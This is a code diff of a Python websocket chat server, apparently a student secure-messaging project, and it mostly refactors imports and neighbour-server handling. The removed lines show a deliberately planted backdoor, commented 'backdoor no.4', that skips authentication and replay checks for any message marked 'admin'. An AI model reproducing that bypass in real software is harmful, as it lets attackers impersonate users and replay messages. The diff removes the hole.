@@ -2,7 +2,7 @@ import logging
 import sys
 import json
 import os
-import crypto
+import src.utils.crypto as crypto
 import base64
 import asyncio
 import websockets
@@ -12,8 +12,8 @@ from aiohttp import web
 import uuid
 
 
-from neighbourhood import Neighbourhood
-from message import Message
+from src.neighbourhood import Neighbourhood
+from src.utils.message import Message
 
 logging.basicConfig(format="%(levelname)s:\t%(message)s", level=logging.INFO)
 
@@ -24,22 +24,23 @@ MAX_FILE_SIZE = 10 * 1024 * 1024
 
 
 class Server:
-    def __init__(self, url: str = "localhost:80") -> None:
+    def __init__(self, url: str = "localhost:80", neighbours: List[str] = []) -> None:
         self._websocket_server: Optional[websocket_server.Server] = None
 
         self.url = url
 
-        self.neighbour_servers = []
+        self.neighbour_servers = neighbours
         self.neighbour_websockets = {}  # Websocket (ServerConnection): Neighbour URL
         self.neighbourhood = Neighbourhood(self.url)
 
         # {websocket: {public_key, fingerprint, counter}}
         self.clients = {}  # List of clients connecting to this server
 
-    def add_neighbour_servers(self, server_urls: List[str]):
+    async def add_neighbour_servers(self, server_urls: List[str]):
         for url in server_urls:
             if url not in self.neighbour_servers:
                 self.neighbour_servers.append(url)
+                await self.connect_to_neighbour(url)
 
     async def connect_to_neighbourhood(self):
         """Create client connections for every neighbour servers"""
@@ -204,34 +205,21 @@ class Server:
         # Connect to neighbour in case the neighbour server starts after this server
         await self.connect_to_neighbour(neighbour_url)
 
-    def check_private_message(self, websocket, message):
-        # backdoor no.4
-        parsed_message = (
-            message["data"]
-            if isinstance(message["data"], dict)
-            else json.loads(message["data"])
-        )
+    def validate_counter(self, websocket, message):
+        sender = self.clients.get(websocket)
+        if not sender:
+            logging.error(f"{self.url} message from unknown client detected")
+            return False
 
-        is_admin = parsed_message.get("admin", False)
-        if is_admin:
-            # bypass check for admin
-            logging.info(f"adminnnnnnn!!")
-            return True
-        else:
-            sender = self.clients.get(websocket)
-            if not sender:
-                logging.error(f"{self.url} message from unknown client detected")
-                return False
+        # Check if the counter is larger or equal to the counter saved in the server
+        sender["counter"] = sender.get("counter", "0")
+        if int(message["counter"]) < int(sender["counter"]):
+            logging.error(f"{self.url} message with replay attack detected")
+            return False
 
-            # Check if the counter is larger or equal to the counter saved in the server
-            sender["counter"] = sender.get("counter", "0")
-            if int(message["counter"]) < int(sender["counter"]):
-                logging.error(f"{self.url} message with replay attack detected")
-                return False
-
-            # Increment counter
-            sender["counter"] = int(message["counter"]) + 1
-            return True
+        # Increment counter
+        sender["counter"] = int(message["counter"]) + 1
+        return True
 
     def get_websocket_from_fingerprint(self, fingerprint):
         """
@@ -255,7 +243,7 @@ class Server:
         if destination_servers is None:
             logging.error(f"{self.url} receives invalid chat message: {message}")
 
-        if self.url not in destination_servers and not self.check_private_message(
+        if self.url not in destination_servers and not self.validate_counter(
             websocket, message
         ):
             return
@@ -301,7 +289,7 @@ class Server:
             return
 
         sender = self.clients.get(websocket, None)
-        if sender is not None and not self.check_private_message(websocket, request):
+        if sender is not None and not self.validate_counter(websocket, request):
             return
 
         # send to clients in the server
@@ -483,8 +471,7 @@ if __name__ == "__main__":
         neighbours.append(sys.argv[3 + i])
 
     # Start server
-    server = Server(server_url)
-    server.add_neighbour_servers(neighbours)
+    server = Server(server_url, neighbours)
 
     loop = asyncio.get_event_loop()
     try:
